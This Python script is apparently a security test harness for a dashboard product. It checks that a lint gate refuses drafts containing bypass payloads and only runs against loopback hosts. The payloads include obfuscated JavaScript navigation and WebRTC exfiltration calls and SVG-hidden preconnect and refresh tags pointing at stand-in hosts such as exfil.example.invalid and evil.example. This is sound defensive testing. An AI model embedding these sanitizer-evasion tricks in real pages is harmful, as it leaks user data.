"""Live proof for the 06-VERIFICATION.md gap 1 payloads on the wired operator path.

Harness and dev machine only, not part of the product. Stores each bypass payload as an
operator draft and asserts the lint-gated mint route refuses it with 422, then proves a
clean draft still mints and is served. Refuses (exit 2) unless SCENARIO_DEMO_STACK=1 and
both base URLs are loopback. Tokens and the ops key are never printed (len=N only).

Phase 12: covers every 06-VERIFICATION bypass payload; body checks read /frame
(the page URL is a constant sandbox wrapper once plan 12-01 is deployed).
Phase 12 gap closure: hidden-markup pages (svg/style, svg/title) must be refused.

Run from backend/:  SCENARIO_DEMO_STACK=1 uv run --frozen python scripts/dashboard_lint_probe.py
Exit codes: 0 pass, 1 fail, 2 refused or unhealthy.
"""

import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = os.getenv("BASE_URL", "http://127.0.0.1:9061")
DASH = os.getenv("DASH_URL", "http://127.0.0.1:9062")
SECRETS = "D:/Code repo/Intelligence corner/intelligence-corner/deploy/secrets.env"
SLUG = "scenario-lint-probe"
LIB_LINE = ('<script src="/d/_lib/chart.js-4.5.1/chart.umd.min.js" '
            'integrity="sha256-SERKgtTty1vsDxll+qzd4Y2cF9swY9BCq62i9wXJ9Uo="></script>')
QUERIES = [{"id": "probe", "sql": "SELECT 1 AS n"}]


def _page(extra: str = "", *, body: str = "") -> str:
    return ('<!doctype html>\n<html lang="en"><head>\n'
            '<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">\n'
            '<title>Lint probe</title>\n' + LIB_LINE + '\n</head><body>\n'
            '<h1>Lint probe</h1>' + body + '<canvas id="c"></canvas><a id="x" href="#top">x</a>\n<script>\n'
            "fetch('./data/probe' + location.search, { cache: 'no-store' })"
            ".then(r => r.json()).then(d => {\n"
            "  new Chart(document.getElementById('c'), { type: 'bar', data: { labels: ['n'], "
            "datasets: [{ label: 'n', data: d.rows.map(r => r.n) }] } });\n"
            "}).catch(e => { document.title = e.message; });\n" + extra +
            "\n</script></body></html>\n")


# Phase 12 gap closure (12-VERIFICATION gap 1): markup hidden from html.parser.
_REFRESH = '<meta http-equiv="refresh" content="0;url=/' + chr(92) + 'exfil.example.invalid/x">'
_OPENERS = {"quoted-close": '<svg><g data-x="</svg>">', "unquoted-slash": '<svg data-x=a/>'}
MARKUP_PAYLOADS = [
    ("svg-style-hidden-preconnect",
     '<svg><style></svg><link rel="preconnect" href="//exfil.example.invalid"></style>'),
    ("svg-title-hidden-preconnect",
     '<svg><title></svg><link rel="preconnect" href="//exfil.example.invalid"></title>'),
] + [
    # AGENT-07 post-merge fix: the svg depth counter desynchronised two ways, carriers title/script.
    (f"svg-{opener}-{carrier}-refresh",
     (_OPENERS[opener] + f"<{carrier}>" + _REFRESH + f"</{carrier}>"
      + ("</g></svg>" if opener == "quoted-close" else "</svg>")))
    for opener in ("quoted-close", "unquoted-slash") for carrier in ("title", "script")
]

PAYLOADS = [
    ("window-alias-computed-href",
     "const w = window; w['loc'+'ation']['hr'+'ef'] = '/'+'/example.invalid/?x=1';"),
    ("document-alias-computed-location",
     "const D = document; D['loc'+'ation'] = 'https://example.invalid/?x=1';"),
    ("globalthis-alias-computed-location",
     "const g = globalThis; g['loc'+'ation'] = 'https://example.invalid/?x=1';"),
    ("globalthis-split-rtc",
     "const g = globalThis; const P = g['R'+'TCPeerConnection']; "
     "new P({iceServers:[{urls:'stu'+'n:'+'x.example.invalid'}]});"),
    ("protocol-relative-two-literals",
     "const u = '/' + '/example.invalid/?x=1'; void u;"),
    # Phase 12 (AGENT-07): the seven 06-VERIFICATION payloads, verbatim, plus a Location part setter
    ("dotted-self-alias-nav",
     "const w = window.window; const a = 'loc'; const k = a + 'ation'; const s = '/'; "
     "w[k] = s + '/exfil.example.invalid/?n=' + 1;"),
    ("ownerdocument-join-nav",
     "const D = document.getElementById('c').ownerDocument; const k = ['loc', 'ation'].join(''); "
     "D[k] = ['/', '/exfil.example.invalid/?n=', 1].join('');"),
    ("anchor-dispatch-click",
     "const el = document.getElementById('x'); const h = 'hr'; const k = h + 'ef'; const s = '/'; "
     "el[k] = s + '/exfil.example.invalid/?n=' + 1; el.dispatchEvent(new MouseEvent('click'));"),
    ("dotted-self-webrtc",
     "const g = globalThis.globalThis; const r = 'R'; const k = r + 'TCPeerConnection'; const P = g[k]; "
     "const st = 'stu'; new P({iceServers: [{urls: st + 'n:' + 1 + '.evil.example'}]});"),
    ("event-view-nav",
     "const el = document.getElementById('x'); el.addEventListener('mouseover', e => { const w = e.view; "
     "const a = 'loc'; const k = a + 'ation'; const s = '/'; w[k] = s + '/evil.example/'; });"),
    ("template-literal-key",
     "const w = self.self; const a = 'loc'; const k = `${a}ation`;"),
    ("concat-method",
     "const D = document.body.ownerDocument; const k = 'loc'.concat('ation');"),
    ("location-parts",
     "const u = document.getElementById('x'); u.hostname = 'exfil.example.invalid';"),
]


class Fail(Exception):
    pass


def _key() -> str:
    k = os.getenv("OPS_KEY", "")
    if not k and os.path.exists(SECRETS):
        for line in open(SECRETS, encoding="utf-8"):
            if line.startswith("OPS_KEY="):
                k = line.split("=", 1)[1].strip()
    return k.strip("\r\n \"'")


KEY = _key()


def raw(method, url, body=None, headers=None, timeout=60):
    data = json.dumps(body).encode() if body is not None else None
    h = dict(headers or {})
    if body is not None:
        h["content-type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def api(method, path, body=None):
    return raw(method, BASE + path, body, {"x-ops-key": KEY})


def need(cond, name, detail=""):
    if not cond:
        raise Fail(f"{name}" + (f" ({detail})" if detail else ""))


def save(code, note):
    st, b = api("POST", f"/api/dashboards/{SLUG}/versions",
                {"title": "Lint probe", "code": code, "queries": QUERIES, "change_note": note})
    need(st == 200, "save draft", f"HTTP {st}: {b[:200]!r}")
    return json.loads(b)["version"]


def guard():
    for u in (BASE, DASH):
        host = urllib.parse.urlparse(u).hostname or ""
        if host not in ("localhost", "127.0.0.1", "::1"):
            print(f"REFUSED: {u} is not loopback")
            sys.exit(2)
    if os.getenv("SCENARIO_DEMO_STACK") != "1":
        print("REFUSED: set SCENARIO_DEMO_STACK=1 only on the Northwind demo stack")
        sys.exit(2)
    if not KEY:
        print("REFUSED: no OPS_KEY")
        sys.exit(2)
    try:
        st, _ = api("GET", "/api/dashboards")
    except OSError as e:
        print(f"REFUSED: stack unreachable: {e}")
        sys.exit(2)
    if st != 200:
        print(f"REFUSED: stack unhealthy (HTTP {st})")
        sys.exit(2)


def main() -> int:
    guard()
    refused = 0
    try:
        for name, stmt in PAYLOADS:
            v = save(_page(stmt), f"bypass payload: {name}")
            st, b = api("POST", f"/api/dashboards/{SLUG}/versions/{v}/preview", {})
            need(st == 422, f"{name} refused", f"HTTP {st}")
            need(b"preview_token" not in b, f"{name} leaked no token")
            findings = (json.loads(b).get("detail") or {}).get("findings") or []
            need(findings, f"{name} has findings")
            print(f"  refused {name}: HTTP {st} rule={findings[0].get('rule')}")
            refused += 1
        for name, frag in MARKUP_PAYLOADS:
            v = save(_page(body=frag), f"hidden markup payload: {name}")
            st, b = api("POST", f"/api/dashboards/{SLUG}/versions/{v}/preview", {})
            need(st == 422, f"{name} refused", f"HTTP {st}")
            need(b"preview_token" not in b, f"{name} leaked no token")
            findings = (json.loads(b).get("detail") or {}).get("findings") or []
            need(findings, f"{name} has findings")
            need(any(f.get("rule") in ("foreign_raw_text", "resource_hint") for f in findings),
                 f"{name} hit a gap-closure rule")
            print(f"  refused {name}: HTTP {st} rule={findings[0].get('rule')}")
            refused += 1
        v = save(_page(), "clean control")
        st, b = api("POST", f"/api/dashboards/{SLUG}/versions/{v}/preview", {})
        need(st == 200, "clean draft mints", f"HTTP {st}: {b[:200]!r}")
        out = json.loads(b)
        tok = out["preview_token"]
        need(out["url"] == out["path"] + "?p=" + tok, "url shape")
        st, page = raw("GET", DASH + out["url"])
        need(st == 200, "clean draft served", f"HTTP {st}")
        if b'sandbox="allow-scripts"' in page:  # plan 12-01 wrapper: agent HTML lives at .../frame
            path, _, qs = out["url"].partition("?")
            st, page = raw("GET", DASH + path.rstrip("/") + "/frame" + ("?" + qs if qs else ""))
            need(st == 200, "clean draft frame served", f"HTTP {st}")
        need(b"Lint probe" in page, "clean draft content served")
        print(f"  control minted: token len={len(tok)}, served HTTP {st}")
    except Fail as e:
        print(f"FAIL dashboard lint probe: {e} (slug {SLUG})")
        return 1
    print(f"PASS dashboard lint probe: {refused} payloads refused, clean draft minted (slug {SLUG})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
